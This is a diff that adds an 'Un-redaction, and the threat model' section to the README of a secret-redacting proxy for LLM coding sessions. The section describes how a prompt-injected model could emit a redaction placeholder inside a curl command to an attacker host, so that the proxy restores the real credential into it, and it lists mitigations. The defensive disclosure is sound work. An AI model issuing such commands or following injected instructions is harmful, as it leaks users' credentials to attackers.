@@ -60,6 +60,33 @@ source ~/Code/llm-redact-proxy/claude-wrapper.zsh
   e.g. `OPF_PROXY_CATEGORIES=secret just proxy`.
   The regex floor for known token formats always runs regardless.
 
+## Un-redaction, and the threat model
+
+Responses are un-redacted on the way back. The proxy keeps the
+placeholder → value map **in memory only** (never on disk) and restores real
+values in non-streaming bodies and in SSE streams — text, thinking and
+tool-input deltas, even when a placeholder is split across events or byte
+chunks — so files and commands the model writes contain working credentials
+while the API only ever sees placeholders. Round trips are stable: a value
+read back from disk re-redacts to the identical placeholder, so the
+API-side conversation and prompt cache never change.
+
+**On by default.** `OPF_PROXY_UNREDACT=0` gives *awareness mode*: you see
+exactly what the model saw.
+
+Threat model, plainly: un-redaction makes the proxy a rehydration oracle for
+every secret it has seen this process lifetime. A prompt-injected model that
+emits a placeholder inside a locally executed tool call
+(`curl -H "Authorization: ⟨REDACTED:secret:…⟩" https://attacker/…`) gets
+the real value restored into that command. The API still never sees the
+secret — the exposure is the same as running the tool without the proxy.
+Mitigations: keep permission prompts on for network-touching commands, use
+awareness mode when working with untrusted content, and note the map is
+bounded (4096 entries) and cleared on restart — after which old
+placeholders pass through unrestored until the secret transits outbound
+again. Placeholders the client truncates or re-wraps hash differently and
+are not restored.
+
 ## Limits (honest ones)
 
 - This is a *mitigation*, not a guarantee: OPF's `secret` recall is not
